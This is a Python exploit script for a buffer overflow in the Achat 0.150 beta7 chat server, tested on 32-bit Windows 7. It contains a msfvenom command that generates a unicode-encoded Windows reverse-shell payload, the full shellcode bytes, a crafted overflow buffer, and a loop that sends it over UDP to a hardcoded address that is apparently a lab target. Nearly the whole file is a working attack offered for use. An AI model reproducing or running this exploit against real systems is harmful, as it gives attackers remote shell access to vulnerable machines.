#!/usr/bin/python
# Author KAhara MAnhara
# Edited By VEEXH - 03/10/2023
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x39\x6c\x49\x58\x43\x52\x39\x70"
buf += b"\x39\x70\x6b\x50\x61\x50\x31\x79\x37\x75\x50\x31"
buf += b"\x49\x30\x43\x34\x62\x6b\x50\x50\x4c\x70\x42\x6b"
buf += b"\x31\x42\x6a\x6c\x62\x6b\x6f\x62\x6a\x74\x72\x6b"
buf += b"\x42\x52\x4e\x48\x4c\x4f\x74\x77\x30\x4a\x6e\x46"
buf += b"\x30\x31\x39\x6f\x46\x4c\x4d\x6c\x73\x31\x33\x4c"
buf += b"\x6d\x32\x6c\x6c\x6d\x50\x49\x31\x68\x4f\x7a\x6d"
buf += b"\x6b\x51\x77\x57\x79\x52\x5a\x52\x51\x42\x31\x47"
buf += b"\x42\x6b\x50\x52\x4c\x50\x72\x6b\x4f\x5a\x4f\x4c"
buf += b"\x62\x6b\x6e\x6c\x6b\x61\x73\x48\x79\x53\x71\x38"
buf += b"\x59\x71\x6a\x31\x72\x31\x52\x6b\x72\x39\x4f\x30"
buf += b"\x49\x71\x67\x63\x42\x6b\x30\x49\x6d\x48\x5a\x43"
buf += b"\x4d\x6a\x4e\x69\x52\x6b\x4f\x44\x52\x6b\x6d\x31"
buf += b"\x79\x46\x4c\x71\x49\x6f\x34\x6c\x79\x31\x56\x6f"
buf += b"\x6a\x6d\x4a\x61\x68\x47\x6f\x48\x37\x70\x34\x35"
buf += b"\x68\x76\x6d\x33\x51\x6d\x68\x78\x6d\x6b\x73\x4d"
buf += b"\x4c\x64\x43\x45\x39\x54\x71\x48\x62\x6b\x31\x48"
buf += b"\x4b\x74\x79\x71\x4a\x33\x62\x46\x32\x6b\x6a\x6c"
buf += b"\x70\x4b\x52\x6b\x31\x48\x4d\x4c\x59\x71\x39\x43"
buf += b"\x72\x6b\x59\x74\x62\x6b\x6a\x61\x5a\x30\x34\x49"
buf += b"\x4e\x64\x6b\x74\x6e\x44\x61\x4b\x71\x4b\x30\x61"
buf += b"\x4f\x69\x61\x4a\x62\x31\x69\x6f\x6b\x30\x71\x4f"
buf += b"\x61\x4f\x6f\x6a\x34\x4b\x6d\x42\x48\x6b\x72\x6d"
buf += b"\x51\x4d\x33\x38\x30\x33\x6f\x42\x4b\x50\x39\x70"
buf += b"\x73\x38\x54\x37\x53\x43\x4e\x52\x4f\x6f\x51\x44"
buf += b"\x33\x38\x70\x4c\x61\x67\x4b\x76\x4d\x37\x79\x6f"
buf += b"\x79\x45\x47\x48\x54\x50\x4a\x61\x69\x70\x6d\x30"
buf += b"\x4c\x69\x48\x44\x52\x34\x42\x30\x51\x58\x6b\x79"
buf += b"\x43\x50\x72\x4b\x79\x70\x69\x6f\x59\x45\x72\x30"
buf += b"\x52\x30\x6e\x70\x42\x30\x71\x30\x62\x30\x4f\x50"
buf += b"\x32\x30\x31\x58\x68\x6a\x7a\x6f\x57\x6f\x69\x50"
buf += b"\x69\x6f\x4a\x35\x62\x77\x70\x6a\x59\x75\x4f\x78"
buf += b"\x49\x7a\x59\x7a\x6c\x50\x4d\x48\x71\x58\x6c\x42"
buf += b"\x59\x70\x6a\x71\x51\x4c\x65\x39\x4a\x46\x52\x4a"
buf += b"\x4a\x70\x70\x56\x50\x57\x63\x38\x35\x49\x53\x75"
buf += b"\x32\x54\x51\x51\x39\x6f\x79\x45\x31\x75\x49\x30"
buf += b"\x71\x64\x6c\x4c\x49\x6f\x50\x4e\x5a\x68\x33\x45"
buf += b"\x5a\x4c\x42\x48\x5a\x50\x64\x75\x74\x62\x4f\x66"
buf += b"\x69\x6f\x46\x75\x42\x48\x63\x33\x30\x6d\x53\x34"
buf += b"\x4d\x30\x55\x39\x37\x73\x50\x57\x42\x37\x52\x37"
buf += b"\x70\x31\x48\x76\x71\x5a\x6c\x52\x50\x59\x30\x56"
buf += b"\x47\x72\x59\x6d\x72\x46\x75\x77\x4f\x54\x4b\x74"
buf += b"\x6d\x6c\x6b\x51\x5a\x61\x74\x4d\x4d\x74\x4d\x54"
buf += b"\x4c\x50\x46\x66\x6d\x30\x4e\x64\x30\x54\x32\x30"
buf += b"\x72\x36\x72\x36\x31\x46\x71\x36\x52\x36\x4e\x6e"
buf += b"\x30\x56\x4e\x76\x6f\x63\x50\x56\x51\x58\x44\x39"
buf += b"\x36\x6c\x4d\x6f\x65\x36\x39\x6f\x36\x75\x75\x39"
buf += b"\x79\x50\x50\x4e\x4f\x66\x30\x46\x6b\x4f\x6c\x70"
buf += b"\x63\x38\x79\x78\x65\x37\x6d\x4d\x53\x30\x39\x6f"
buf += b"\x59\x45\x45\x6b\x38\x70\x38\x35\x47\x32\x31\x46"
buf += b"\x32\x48\x34\x66\x74\x55\x65\x6d\x63\x6d\x6b\x4f"
buf += b"\x58\x55\x4f\x4c\x7a\x66\x33\x4c\x6c\x4a\x43\x50"
buf += b"\x39\x6b\x67\x70\x72\x55\x4b\x55\x35\x6b\x4d\x77"
buf += b"\x4d\x43\x31\x62\x32\x4f\x51\x5a\x69\x70\x6f\x63"
buf += b"\x4b\x4f\x67\x65\x41\x41"


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.129.240.201', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40"
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf.decode() + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print ("---->{P00F}!")
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)].encode(), server_address)
    i += sent
sock.close()
